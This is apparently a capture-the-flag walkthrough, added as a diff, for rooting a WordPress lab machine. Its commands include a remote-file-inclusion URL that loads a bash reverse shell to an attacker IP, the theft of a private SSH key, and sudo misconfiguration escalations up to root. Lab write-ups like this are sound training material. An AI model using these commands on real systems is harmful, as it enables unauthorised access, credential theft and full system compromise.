@@ -1,0 +1,49 @@
+* Netdiscover 
+  - This gets the IP address for the box
+  
+* wpscan --url http://<IP>/wordpress/ --enumerate u,p
+  - FOUND vulnerable path -> /wp-admin/admin-post.php?swp-debug=load_options&swp_url=%s
+  
+* vim bash_shell.txt
+  - <pre>system("bash -c 'bash -i >& /dev/tcp/<IP>/9001 0>&1'");<pre>
+  
+* nc -lvnp 9001
+
+* http://<IP>//wp-admin/admin-post.php?swp-debug=load_options&swp_url=<HOST IP>/bash_shell.txt
+  - This uploads the shell and thus I now have access to www-data
+  
+* cd /home/max/.ssh
+  - FOUND private ssh key
+  
+* vim key
+  - paste private key
+
+* chmod 600 key
+
+* ssh max@<IP> -i key
+  - This got me in as Max (user not root)
+  
+* sudo -l
+  - FOUND - no password /usr/sbin/service
+
+* sudo -u steven /usr/sbin/service ../../bin/sh
+
+* python3 -c 'import pty;pty.spawn("/bin/bash")'
+  - in as steven (still usr not root)
+
+* sudo -l 
+  - FOUND - no password /opt/tools/server-health.sh
+  
+* mkdir /opt/tools
+
+* vim server-health.sh
+  - #!/bin/bash
+  - bash
+  
+* chmod +x server-health.sh
+
+* sudo -u root /opt/tools/server-health.sh 
+  
+* cd root
+
+* cat flag.txt
